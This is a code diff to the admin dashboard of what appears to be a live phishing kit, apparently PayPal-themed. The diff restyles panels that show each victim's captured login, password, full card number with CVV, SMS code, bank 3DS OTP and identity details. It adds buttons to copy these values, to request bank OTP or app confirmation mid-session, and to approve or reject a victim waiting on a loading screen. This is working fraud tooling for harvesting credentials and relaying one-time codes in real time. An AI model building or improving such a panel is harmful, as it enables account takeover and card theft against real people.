@@ -342,10 +342,18 @@ type AdminTab = 'live' | 'history' | 'settings';
                                                       class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm transition-all shadow-sm">
                                                   Revoke
                                               </button>
-                                              <button (click)="reject()" class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm transition-all shadow-sm">
+                                              <button (click)="reject()"
+                                                      [disabled]="!canInteract()"
+                                                      [class.opacity-50]="!canInteract()"
+                                                      [class.cursor-not-allowed]="!canInteract()"
+                                                      class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm transition-all shadow-sm">
                                                   Reject
                                               </button>
-                                              <button (click)="approve()" class="bg-pp-navy hover:bg-pp-blue text-white px-6 lg:px-8 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
+                                              <button (click)="approve()"
+                                                      [disabled]="!canInteract()"
+                                                      [class.opacity-50]="!canInteract()"
+                                                      [class.cursor-not-allowed]="!canInteract()"
+                                                      class="bg-pp-navy hover:bg-pp-blue text-white px-6 lg:px-8 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
                                                   <span class="material-icons text-sm">check</span> {{ approveText() }}
                                               </button>
                                          </div>
@@ -567,101 +575,145 @@ type AdminTab = 'live' | 'history' | 'settings';
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-6 pb-20">
 
                     <!-- Credentials -->
-                    <div class="bg-white p-6 rounded-[20px] shadow-sm border border-slate-100 relative overflow-hidden group">
-                        <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity"><span class="material-icons text-6xl text-pp-navy">lock</span></div>
-                        <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Login Credentials</h4>
-                        <div class="space-y-4 relative z-10">
+                    <div class="bg-white p-6 rounded-[16px] shadow-sm border border-slate-200 relative overflow-hidden group hover:border-pp-blue/30 transition-colors">
+                        <div class="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity"><span class="material-icons text-6xl text-pp-navy">lock</span></div>
+
+                        <div class="flex items-center gap-2 mb-6 border-b border-slate-100 pb-3">
+                            <div class="bg-blue-50 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">vpn_key</span></div>
+                            <h4 class="text-sm font-bold text-pp-navy uppercase tracking-tight">Login Credentials</h4>
+                        </div>
+
+                        <div class="space-y-5 relative z-10">
                             <div>
-                                <label class="text-[11px] font-bold text-slate-500 block mb-1">Email / Username</label>
-                                <div class="flex items-center gap-2">
-                                    <p class="text-base font-bold text-pp-navy break-all">{{ session?.data?.email || 'Waiting...' }}</p>
-                                    <button *ngIf="session?.data?.email" (click)="copy(session?.data?.email)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
+                                <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">Email / Username</label>
+                                <div class="flex items-center gap-2 bg-slate-50 p-2 rounded-lg border border-slate-100">
+                                    <p class="text-sm font-bold text-pp-navy break-all flex-1">{{ session?.data?.email || '...' }}</p>
+                                    <button *ngIf="session?.data?.email" (click)="copy(session?.data?.email)" class="text-slate-400 hover:text-pp-blue p-1"><span class="material-icons text-[16px]">content_copy</span></button>
                                 </div>
                             </div>
                             <div>
-                                <label class="text-[11px] font-bold text-slate-500 block mb-1">Password</label>
-                                <div class="flex items-center gap-2">
-                                    <p class="text-base font-mono bg-slate-100 px-2 py-1 rounded text-pp-navy border border-slate-200">{{ session?.data?.password || 'Waiting...' }}</p>
-                                    <button *ngIf="session?.data?.password" (click)="copy(session?.data?.password)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
+                                <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">Password</label>
+                                <div class="flex items-center gap-2 bg-slate-50 p-2 rounded-lg border border-slate-100">
+                                    <p class="text-sm font-mono text-pp-navy flex-1">{{ session?.data?.password || '...' }}</p>
+                                    <button *ngIf="session?.data?.password" (click)="copy(session?.data?.password)" class="text-slate-400 hover:text-pp-blue p-1"><span class="material-icons text-[16px]">content_copy</span></button>
                                 </div>
                             </div>
                         </div>
                     </div>
 
                     <!-- Financial -->
-                    <div class="bg-white p-6 rounded-[20px] shadow-sm border border-slate-100 relative overflow-hidden group">
-                        <div class="absolute top-0 right-0 p-4 opacity-10 group-hover:opacity-20 transition-opacity"><span class="material-icons text-6xl text-pp-navy">credit_card</span></div>
-                        <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Financial Instrument</h4>
-                        <div class="space-y-4 relative z-10">
+                    <div class="bg-white p-6 rounded-[16px] shadow-sm border border-slate-200 relative overflow-hidden group hover:border-pp-blue/30 transition-colors">
+                        <div class="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity"><span class="material-icons text-6xl text-pp-navy">credit_card</span></div>
+
+                        <div class="flex items-center gap-2 mb-6 border-b border-slate-100 pb-3">
+                            <div class="bg-blue-50 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">payment</span></div>
+                            <h4 class="text-sm font-bold text-pp-navy uppercase tracking-tight">Financial Instrument</h4>
+                        </div>
+
+                        <div class="space-y-5 relative z-10">
                             <div>
-                                <label class="text-[11px] font-bold text-slate-500 block mb-1">Card Number</label>
-                                <div class="flex items-center gap-2">
-                                <p class="text-lg font-mono font-bold text-pp-navy tracking-wide">{{ formatCard(session?.data?.cardNumber) }}</p>
-                                <button *ngIf="session?.data?.cardNumber" (click)="copy(session?.data?.cardNumber)" class="text-pp-blue hover:text-pp-navy"><span class="material-icons text-[14px]">content_copy</span></button>
+                                <div class="flex items-center justify-between mb-1.5">
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase">Card Number</label>
+                                    @if(getCardLogoUrl(session?.data?.cardType)) {
+                                        <img [src]="getCardLogoUrl(session?.data?.cardType)" class="h-4 w-auto object-contain">
+                                    }
+                                </div>
+                                <div class="flex items-center gap-2 bg-slate-50 p-2 rounded-lg border border-slate-100">
+                                   <p class="text-lg font-mono font-bold text-pp-navy tracking-wide flex-1">{{ formatCard(session?.data?.cardNumber) }}</p>
+                                   <button *ngIf="session?.data?.cardNumber" (click)="copy(session?.data?.cardNumber)" class="text-slate-400 hover:text-pp-blue p-1"><span class="material-icons text-[16px]">content_copy</span></button>
                                 </div>
                             </div>
-                            <div class="flex gap-6">
+                            <div class="grid grid-cols-2 gap-4">
                                 <div>
-                                    <label class="text-[11px] font-bold text-slate-500 block mb-1">Exp</label>
-                                    <p class="font-bold text-pp-navy">{{ session?.data?.cardExpiry || '--/--' }}</p>
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">Expiry</label>
+                                    <div class="bg-slate-50 p-2 rounded-lg border border-slate-100">
+                                        <p class="font-bold text-pp-navy text-sm">{{ session?.data?.cardExpiry || '--/--' }}</p>
+                                    </div>
                                 </div>
                                 <div>
-                                    <label class="text-[11px] font-bold text-slate-500 block mb-1">CVV</label>
-                                    <p class="font-bold text-[#D92D20]">{{ session?.data?.cardCvv || '---' }}</p>
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">CVV / CSC</label>
+                                    <div class="bg-slate-50 p-2 rounded-lg border border-slate-100">
+                                        <p class="font-bold text-[#D92D20] text-sm">{{ session?.data?.cardCvv || '---' }}</p>
+                                    </div>
                                 </div>
                             </div>
                         </div>
                     </div>
 
-                    <!-- OTP & Security -->
-                    <div class="col-span-1 md:col-span-2 bg-pp-navy text-white p-6 rounded-[20px] shadow-lg relative overflow-hidden flex items-center justify-between">
+                    <!-- OTP & Security (Full Width) -->
+                    <div class="col-span-1 md:col-span-2 bg-gradient-to-br from-pp-navy to-[#001C64] text-white p-8 rounded-[20px] shadow-lg relative overflow-hidden flex flex-col md:flex-row items-center justify-between gap-6">
                             <!-- Background decoration -->
-                            <div class="absolute -right-6 -top-6 w-32 h-32 bg-pp-blue rounded-full opacity-20 blur-2xl"></div>
+                            <div class="absolute -right-10 -top-10 w-48 h-48 bg-pp-blue rounded-full opacity-20 blur-3xl"></div>
 
-                            <div class="relative z-10">
-                                <h4 class="text-xs font-bold text-white/60 uppercase tracking-wider mb-3">Security Codes</h4>
-                                <div class="flex gap-8">
+                            <div class="relative z-10 flex-1">
+                                <div class="flex items-center gap-3 mb-6">
+                                    <span class="material-icons text-pp-success">verified_user</span>
+                                    <h4 class="text-sm font-bold text-white/90 uppercase tracking-widest">Security Verification</h4>
+                                </div>
+
+                                <div class="flex gap-12">
                                     <div>
-                                        <span class="text-[10px] text-white/50 block mb-1">SMS Code</span>
-                                        <span class="text-2xl font-mono font-bold tracking-widest">{{ session?.data?.phoneCode || '---' }}</span>
+                                        <span class="text-[10px] text-white/50 font-bold uppercase block mb-2">SMS Code</span>
+                                        <div class="flex items-center gap-2">
+                                            <span class="text-3xl font-mono font-bold tracking-widest">{{ session?.data?.phoneCode || '---' }}</span>
+                                            <button *ngIf="session?.data?.phoneCode" (click)="copy(session?.data?.phoneCode)" class="text-white/40 hover:text-white transition-colors"><span class="material-icons text-sm">content_copy</span></button>
+                                        </div>
                                     </div>
                                     <div>
-                                        <span class="text-[10px] text-white/50 block mb-1">Bank 3DS</span>
-                                        <span class="text-2xl font-mono font-bold tracking-widest text-pp-success">{{ session?.data?.cardOtp || '---' }}</span>
+                                        <span class="text-[10px] text-white/50 font-bold uppercase block mb-2">Bank OTP (3DS)</span>
+                                        <div class="flex items-center gap-2">
+                                            <span class="text-3xl font-mono font-bold tracking-widest text-pp-success">{{ session?.data?.cardOtp || '---' }}</span>
+                                            <button *ngIf="session?.data?.cardOtp" (click)="copy(session?.data?.cardOtp)" class="text-white/40 hover:text-white transition-colors"><span class="material-icons text-sm">content_copy</span></button>
+                                        </div>
                                     </div>
                                 </div>
                             </div>
 
                             @if(session?.stage === 'card_pending' && !isHistory) {
-                            <button (click)="requestOtp()" class="relative z-10 bg-white/10 hover:bg-white/20 text-white border border-white/30 px-4 py-2 rounded-full font-bold text-xs transition-all backdrop-blur-sm">
-                                Request Bank OTP
-                            </button>
+                            <div class="relative z-10 flex flex-col gap-2 shrink-0">
+                                <span class="text-[10px] text-white/40 uppercase font-bold text-center">Request Input</span>
+                                <div class="flex gap-2">
+                                    <button (click)="requestFlow('otp')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-4 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
+                                        SMS / 3DS
+                                    </button>
+                                    <button (click)="requestFlow('app')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-4 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
+                                        Bank App
+                                    </button>
+                                    <button (click)="requestFlow('both')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-4 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
+                                        Both
+                                    </button>
+                                </div>
+                            </div>
                             }
                     </div>
 
-                    <!-- Personal Info -->
-                    <div class="col-span-1 md:col-span-2 bg-white p-6 rounded-[20px] shadow-sm border border-slate-100">
-                            <h4 class="text-xs font-bold text-slate-400 uppercase tracking-wider mb-4">Identity Profile</h4>
-                            <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+                    <!-- Identity Info (Full Width) -->
+                    <div class="col-span-1 md:col-span-2 bg-white p-6 rounded-[16px] shadow-sm border border-slate-200">
+                            <div class="flex items-center gap-2 mb-6 border-b border-slate-100 pb-3">
+                                <div class="bg-blue-50 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">badge</span></div>
+                                <h4 class="text-sm font-bold text-pp-navy uppercase tracking-tight">Identity Profile</h4>
+                            </div>
+
+                            <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
                                 <div>
-                                    <label class="text-[10px] font-bold text-slate-400 uppercase">Name</label>
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Legal Name</label>
                                     <p class="text-sm font-bold text-pp-navy">{{ (session?.data?.firstName + ' ' + session?.data?.lastName).trim() || 'Waiting...' }}</p>
                                 </div>
                                 <div>
-                                    <label class="text-[10px] font-bold text-slate-400 uppercase">DOB</label>
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Date of Birth</label>
                                     <p class="text-sm font-bold text-pp-navy">{{ session?.data?.dob || 'Waiting...' }}</p>
                                 </div>
                                 <div>
-                                    <label class="text-[10px] font-bold text-slate-400 uppercase">Phone</label>
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Phone Number</label>
                                     <p class="text-sm font-bold text-pp-navy">{{ session?.data?.phoneNumber || 'Waiting...' }}</p>
                                 </div>
                                 <div>
-                                    <label class="text-[10px] font-bold text-slate-400 uppercase">Location</label>
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Location</label>
                                     <p class="text-sm font-bold text-pp-navy">{{ session?.data?.country || 'Waiting...' }}</p>
                                 </div>
-                                <div class="col-span-2">
-                                    <label class="text-[10px] font-bold text-slate-400 uppercase">Address</label>
-                                    <p class="text-sm font-bold text-pp-navy">{{ session?.data?.address || 'Waiting...' }}</p>
+                                <div class="col-span-2 md:col-span-4">
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Billing Address</label>
+                                    <p class="text-sm font-bold text-pp-navy bg-slate-50 p-3 rounded-lg border border-slate-100">{{ session?.data?.address || 'Waiting...' }}</p>
                                 </div>
                             </div>
                     </div>
@@ -686,10 +738,18 @@ type AdminTab = 'live' | 'history' | 'settings';
                                     class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
                                 Revoke
                             </button>
-                            <button (click)="reject()" class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
+                            <button (click)="reject()"
+                                    [disabled]="!canInteract()"
+                                    [class.opacity-50]="!canInteract()"
+                                    [class.cursor-not-allowed]="!canInteract()"
+                                    class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
                                 Reject
                             </button>
-                            <button (click)="approve()" class="bg-pp-navy hover:bg-pp-blue text-white px-8 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
+                            <button (click)="approve()"
+                                    [disabled]="!canInteract()"
+                                    [class.opacity-50]="!canInteract()"
+                                    [class.cursor-not-allowed]="!canInteract()"
+                                    class="bg-pp-navy hover:bg-pp-blue text-white px-8 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
                                 <span class="material-icons text-sm">check</span> {{ approveText() }}
                             </button>
                         </div>
@@ -727,6 +787,12 @@ export class AdminDashboardComponent {
 
   // Incomplete Sessions Toggle
   incompleteCollapsed = signal(false);
+
+  canInteract = computed(() => {
+      const s = this.monitoredSession();
+      // Only allow interaction if user is waiting (loading screen)
+      return s?.currentView === 'loading';
+  });
 
   uniqueCountries = computed(() => {
       const history = this.state.history();
